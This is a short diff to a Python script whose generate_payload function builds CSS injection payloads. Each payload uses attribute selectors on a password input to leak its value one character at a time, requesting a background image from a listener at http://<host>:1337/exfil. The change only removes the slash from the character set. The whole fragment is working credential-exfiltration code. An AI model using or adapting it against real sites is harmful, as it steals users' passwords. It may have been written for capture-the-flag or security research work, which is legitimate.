@@ -4,7 +4,7 @@ import sys
 
 def generate_payload(target):
     # 1. We start by detecting a starting char, i.e `a_`
-    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",!_@/'-=.][*:` " 
+    charset = string.ascii_lowercase + string.ascii_uppercase + string.digits + ",!_@'-=.][*:` " 
     payload = ""
     for char in charset:
         c_payload = 'input[type="password"][value^="%s"] { background-image: url("http://%s:1337/exfil?c=%s_") }\n' % (char, target, char)
